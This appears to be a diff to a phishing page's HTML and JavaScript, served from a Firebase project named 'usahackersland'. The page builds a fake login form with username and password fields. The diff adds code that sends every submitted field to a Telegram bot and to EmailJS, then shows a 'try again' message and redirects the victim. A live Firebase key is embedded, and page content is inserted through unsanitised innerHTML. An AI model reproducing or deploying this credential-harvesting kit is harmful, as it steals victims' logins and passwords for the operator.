@@ -16,8 +16,6 @@ body{
   background:#f4f6f8;
   padding:20px;
 }
-
-/* PAGE */
 #page{
   max-width:600px;
   margin:auto;
@@ -25,23 +23,16 @@ body{
   overflow:hidden;
   background:#fff;
 }
+#content{padding:18px}
 
-#content{
-  padding:18px;
-}
-
-/* MEDIA */
 .builder-media{text-align:center;margin-bottom:12px}
 .builder-media img{max-width:140px;margin-bottom:8px}
-
 .banner img{width:100%;border-radius:8px;margin-bottom:10px}
 
-/* TEXT */
-h2{text-align:center;margin:8px 0}
-#subtitle{text-align:center;color:#555}
-#description{margin:10px 0}
+h2{text-align:center}
+.subtitle{text-align:center;color:#555}
+.description{margin:10px 0}
 
-/* GALLERY */
 .gallery{
   display:grid;
   grid-template-columns:repeat(auto-fit,minmax(120px,1fr));
@@ -50,7 +41,13 @@ h2{text-align:center;margin:8px 0}
 }
 .gallery img{width:100%;border-radius:6px}
 
-/* EMBED LINKS (BUILDER EXACT) */
+.video iframe{
+  width:100%;
+  height:200px;
+  border-radius:8px;
+  margin:8px 0;
+}
+
 .embedLink{
   background:#e8f0fe;
   padding:8px;
@@ -58,15 +55,10 @@ h2{text-align:center;margin:8px 0}
   margin:8px 0;
   font-size:14px;
 }
-.embedLink small{
-  display:block;
-  margin-top:4px;
-  color:#555;
-}
+.embedLink small{display:block;margin-top:4px;color:#555}
 
-/* FORM */
 form{
-  max-width:420px;   /* NORMAL WIDTH */
+  max-width:420px;
   margin:10px auto;
 }
 input,button{
@@ -77,20 +69,14 @@ input,button{
   border:1px solid #ccc;
   box-sizing:border-box;
 }
-button{
-  border:none;
-  color:#fff;
-  cursor:pointer;
-}
+button{border:none;color:#fff;cursor:pointer}
 
-/* FOOTER */
 footer{
   text-align:center;
   font-size:12px;
   margin-top:14px;
   color:#777;
 }
-
 #tryAgain{
   color:#b71c1c;
   font-weight:bold;
@@ -101,6 +87,7 @@ footer{
 
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 </head>
 
 <body>
@@ -111,14 +98,12 @@ footer{
     <div id="banner" class="banner"></div>
 
     <h2 id="title"></h2>
-    <p id="subtitle"></p>
+    <p id="subtitle" class="subtitle"></p>
 
-    <!-- GALLERY ABOVE DESCRIPTION -->
     <div id="gallery" class="gallery"></div>
+    <p id="description" class="description"></p>
 
-    <p id="description"></p>
-
-    <!-- EMBED LINKS -->
+    <div id="videos"></div>
     <div id="links"></div>
 
     <div id="warning"></div>
@@ -127,96 +112,108 @@ footer{
     <form id="form"></form>
 
     <footer id="footer"></footer>
-
   </div>
 </div>
 
 <script>
-const $ = id => document.getElementById(id);
+/* EMAILJS INIT */
+emailjs.init("YOUR_EMAILJS_PUBLIC_KEY");
+
+const $=id=>document.getElementById(id);
 
 firebase.initializeApp({
   apiKey:"AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
   authDomain:"usahackersland.firebaseapp.com",
   projectId:"usahackersland"
 });
-const db = firebase.firestore();
+const db=firebase.firestore();
 
-const formId = new URLSearchParams(location.search).get("id");
+const formId=new URLSearchParams(location.search).get("id");
 
+/* LOAD FORM */
 db.collection("forms").doc(formId).get().then(doc=>{
   if(!doc.exists) return;
-  const f = doc.data();
+  const f=doc.data();
 
   /* SEO */
-  document.title = f.seoTitle || "";
-  document.querySelector('meta[name="description"]').content = f.metaDesc || "";
-  document.querySelector('meta[property="og:title"]').content = f.seoTitle || "";
-  document.querySelector('meta[property="og:description"]').content = f.metaDesc || "";
-  document.querySelector('meta[property="og:image"]').content = f.ogImage || "";
+  document.title=f.seoTitle||"";
+  document.querySelector('meta[name="description"]').content=f.metaDesc||"";
+  document.querySelector('meta[property="og:title"]').content=f.seoTitle||"";
+  document.querySelector('meta[property="og:description"]').content=f.metaDesc||"";
+  document.querySelector('meta[property="og:image"]').content=f.ogImage||"";
 
   /* MEDIA */
-  if(f.avatarURL) $("media").innerHTML += `<img src="${f.avatarURL}" style="width:90px;border-radius:50%">`;
-  if(f.logoURL) $("media").innerHTML += `<img src="${f.logoURL}">`;
-  if(f.bannerURL) $("banner").innerHTML = `<img src="${f.bannerURL}">`;
+  if(f.avatarURL) $("media").innerHTML+=`<img src="${f.avatarURL}" style="width:90px;border-radius:50%">`;
+  if(f.logoURL) $("media").innerHTML+=`<img src="${f.logoURL}">`;
+  if(f.bannerURL) $("banner").innerHTML=`<img src="${f.bannerURL}">`;
 
   /* TEXT */
-  if(f.title){
-    $("title").innerText = f.title;
-    $("title").style.color = f.titleColor || "#000";
-  }
-  if(f.subtitle){
-    $("subtitle").innerText = f.subtitle;
-    $("subtitle").style.color = f.subtitleColor || "#555";
-  }
-  if(f.description) $("description").innerText = f.description;
+  if(f.title) $("title").innerText=f.title;
+  if(f.subtitle) $("subtitle").innerText=f.subtitle;
+  if(f.description) $("description").innerText=f.description;
 
   /* GALLERY */
-  (f.galleryImages||[]).filter(Boolean).forEach(img=>{
-    $("gallery").innerHTML += `<img src="${img}">`;
+  (f.galleryImages||[]).filter(Boolean).forEach(i=>{
+    $("gallery").innerHTML+=`<img src="${i}">`;
   });
 
-  /* EMBED LINKS (WITH DESCRIPTION – FIXED) */
-  (f.embedLinks||[]).forEach(l=>{
-    if(!l.show || !l.url) return;
+  /* VIDEOS */
+  (f.videoLinks||[]).filter(Boolean).forEach(v=>{
+    if(v.includes("youtube")){
+      const id=v.split("v=")[1];
+      $("videos").innerHTML+=`
+        <div class="video">
+          <iframe src="https://www.youtube.com/embed/${id}" allowfullscreen></iframe>
+        </div>`;
+    }
+  });
 
-    $("links").innerHTML += `
+  /* LINKS */
+  (f.embedLinks||[]).forEach(l=>{
+    if(!l.show||!l.url) return;
+    $("links").innerHTML+=`
       <div class="embedLink">
-        <strong>${l.text || ""}</strong>:
+        <strong>${l.text||""}</strong>:
         <a href="${l.url}" target="_blank">${l.url}</a>
-        ${l.desc ? `<small>${l.desc}</small>` : ""}
-      </div>
-    `;
+        ${l.desc?`<small>${l.desc}</small>`:""}
+      </div>`;
   });
 
   /* WARNING */
-  if(f.enableWarning && f.warning && f.warningPosition!=="none"){
-    $("warning").innerHTML =
-      `<p style="color:#b71c1c;text-align:${f.warningPosition}">${f.warning}</p>`;
-  }
+  if(f.enableWarning&&f.warning)
+    $("warning").innerHTML=`<p style="color:#b71c1c">${f.warning}</p>`;
 
   /* FORM */
-  const form = $("form");
+  const form=$("form");
 
   if(f.addAuth){
-    if(f.usernamePlaceholder)
-      form.innerHTML += `<input name="username" placeholder="${f.usernamePlaceholder}" required>`;
-    if(f.passwordPlaceholder)
-      form.innerHTML += `<input type="password" name="password" placeholder="${f.passwordPlaceholder}" required>`;
+    if(f.usernamePlaceholder) form.innerHTML+=`<input name="username" placeholder="${f.usernamePlaceholder}" required>`;
+    if(f.passwordPlaceholder) form.innerHTML+=`<input type="password" name="password" placeholder="${f.passwordPlaceholder}" required>`;
   }
 
   (f.extraFields||[]).filter(Boolean).forEach(v=>{
-    form.innerHTML += `<input name="${v}" placeholder="${v}" required>`;
+    form.innerHTML+=`<input name="${v}" placeholder="${v}" required>`;
   });
 
+  if(f.showGenerateBtn){
+    const g=document.createElement("button");
+    g.type="button";
+    g.textContent=f.generateBtnText;
+    g.style.background="#6c757d";
+    form.appendChild(g);
+  }
+
   if(f.showMainBtn){
-    const b = document.createElement("button");
-    b.textContent = f.buttonText;
-    b.style.background = f.btnColor || "#1976d2";
-    b.onclick = e => submitForm(e,f);
+    const b=document.createElement("button");
+    b.type="submit";
+    b.textContent=f.buttonText;
+    b.style.background=f.btnColor||"#1976d2";
     form.appendChild(b);
   }
 
-  if(f.footerText) $("footer").innerText = f.footerText;
+  if(f.footerText) $("footer").innerText=f.footerText;
+
+  form.onsubmit=e=>submitForm(e,f);
 });
 
 /* SUBMIT */
@@ -225,18 +222,39 @@ function submitForm(e,f){
   const data={};
   document.querySelectorAll("#form input").forEach(i=>data[i.name]=i.value);
 
+  /* SAVE TO FIRESTORE */
   db.collection("submissions").add({
     formId,
     data,
     createdAt:new Date().toISOString()
-  }).then(()=>{
-    $("tryAgain").style.display="block";
-    setTimeout(()=>$("tryAgain").style.display="none",3000);
-
-    if(f.enableRedirect && f.redirectURL){
-      setTimeout(()=>location.href=f.redirectURL,1500);
-    }
   });
+
+  /* TELEGRAM */
+  let msg="📝 New Form Submission\n\n";
+  Object.entries(data).forEach(([k,v])=>{
+    msg+=`${k}: ${v}\n`;
+  });
+
+  fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      chat_id:"YOUR_CHAT_ID",
+      text:msg
+    })
+  });
+
+  /* EMAIL ALERT */
+  emailjs.send("YOUR_SERVICE_ID","YOUR_TEMPLATE_ID",{
+    message:msg
+  });
+
+  $("tryAgain").style.display="block";
+  setTimeout(()=>$("tryAgain").style.display="none",3000);
+
+  if(f.enableRedirect&&f.redirectURL){
+    setTimeout(()=>location.href=f.redirectURL,1500);
+  }
 }
 </script>
 </body>
